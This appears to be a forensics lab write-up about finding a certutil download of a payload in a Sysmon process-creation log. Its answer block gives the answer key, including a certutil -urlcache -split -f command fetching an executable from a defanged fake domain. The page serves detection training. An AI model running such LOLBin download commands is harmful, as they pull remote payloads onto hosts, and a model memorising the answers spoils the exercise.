# Sysmon Certutil Download

## Scenario

certutil is abused to download a payload, caught by Sysmon process create (id 1) with the full command line.

Host: DESKTOP-V96574F  
Evidence: `sysmon-operational.evtx` (real Windows Sysmon EVTX, one chunk)  
Channel: Microsoft-Windows-Sysmon/Operational

## Timeline

A Sysmon id 1 for certutil.exe with -urlcache -split -f and a remote URL.

## How to spot it

- Sysmon 1 Image certutil.exe
- CommandLine has -urlcache -split -f and a URL
- Living off the land download
- Fake delivery domain

## Questions

```
1. Log?               Sysmon 1 (process create)
2. Binary?             certutil.exe
3. CommandLine?         -urlcache -split -f hxxp://cdn-corp[.]xyz/a.exe
4. Why?                LOLBin download
5. Technique?          Ingress tool transfer
```

## How to solve it

1. Extract the evidence, password `hidden`: `7z x 3c67a8a89b0a3d556c4e156a84e52362609b0675fdf940a720d0a568b9f676e7.zip -phidden`. You get `sysmon-operational.evtx`.
2. Open it in Event Viewer: Action > Open Saved Log, or parse it.
3. Filter and read: `Get-WinEvent -Path sysmon-operational.evtx | Where-Object Id -in 1,3 | Format-List TimeCreated,Id,Message`, or `EvtxECmd.exe -f sysmon-operational.evtx --csv . --csvf out.csv`, or `wevtutil qe sysmon-operational.evtx /lf:true /f:text`.
4. Find the malicious record among the normal Sysmon events.
5. Confirm against the answer: Sysmon 1 Image certutil.exe

## MITRE ATT&CK

- T1105 Ingress Tool Transfer
- T1140 Deobfuscate/Decode

## Tools

Event Viewer, Get-WinEvent, EvtxECmd, Chainsaw, Sysmon View, Timeline Explorer.

## Signature

Forensic Sample Blueprint | qayssarayra.com
